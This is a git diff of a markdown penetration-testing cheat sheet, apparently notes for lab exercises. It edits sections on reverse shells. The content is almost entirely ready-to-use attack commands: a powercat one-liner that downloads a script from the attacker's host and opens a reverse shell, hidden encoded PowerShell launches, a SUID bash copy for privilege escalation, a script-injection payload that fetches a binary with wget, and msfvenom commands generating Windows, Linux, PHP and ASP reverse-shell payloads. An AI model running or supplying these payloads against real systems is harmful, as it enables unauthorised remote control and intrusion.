@@ -35,6 +35,7 @@ cp /bin/bash /tmp && chmod +s /tmp/bash
 # 1 KALI
 python3 ps_encode.py
 
+
 # 2 TARGET
 powershell.exe -nop -w hidden -enc encoded_payload...
 ```
@@ -43,15 +44,17 @@ powershell.exe -nop -w hidden -enc encoded_payload...
 # 1 KALI
 python3 cat_encode.py
 
+
 # 2 TARGET
 powershell.exe -nop -w hidden -enc encoded_payload...
 ```
 ## powercat manually typed
 ```shell
-# 1 payload
+# 1 Payload
 IEX(New-Object System.Net.WebClient).DownloadString('http://KALI_IP/resources/powercat.ps1');powercat -c KALI_IP -p 443 -e powershell
 
-# 2 use as follows
+
+# 2 Use as follows
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://KALI_IP/resources/powercat.ps1');powercat -c KALI_IP -p 443 -e powershell"
 ```
 ## nc.exe
@@ -87,10 +90,6 @@ if(isset($_REQUEST['cmd'])){
 ```shell
 # https://github.com/ivan-sincek/php-reverse-shell
 ```
-### msfvenom
-```shell
-msfvenom -p php/reverse_php LHOST=`mip` LPORT=443 -f raw > reverse.php
-```
 ### wordpress plugin
 ```shell
 # POST
@@ -117,11 +116,35 @@ https://gitbook.seguranca-informatica.pt/cheat-sheet-1/web/webshell
 ${script:javascript:java.lang.Runtime.getRuntime().exec("wget http://KALI_IP/reverse -O /tmp/reverse")}
 ```
 
+# *MSFVenom*
+Check [Infinite Logins](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)for help with below 4
+
+## windows reverse
+```shell
+msfvenom -p windows/shell_reverse_tcp lhost=`mip` lport=443 -f exe > reverse.exe
+```
+
+## linux reverse
+```shell
+msfvenom -p linux/x64/shell_reverse_tcp lhost=`mip` lport=443 -f elf > reverse.elf
+```
+## php reverse
+```shell
+msfvenom -p php/reverse_php lhost=`mip` lport=443 -f raw > reverse.php
+```
+## asp reverse
+```shell
+msfvenom -p windows/shell/reverse_tcp lhost=`mip` lport=443 -f asp > reverse.asp
+```
+
 # ***upgrade shell***
 ```shell
+# 1 TARGET
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm
 ^z
 
+
+# 2 KALI
 stty raw -echo;fg
 ```
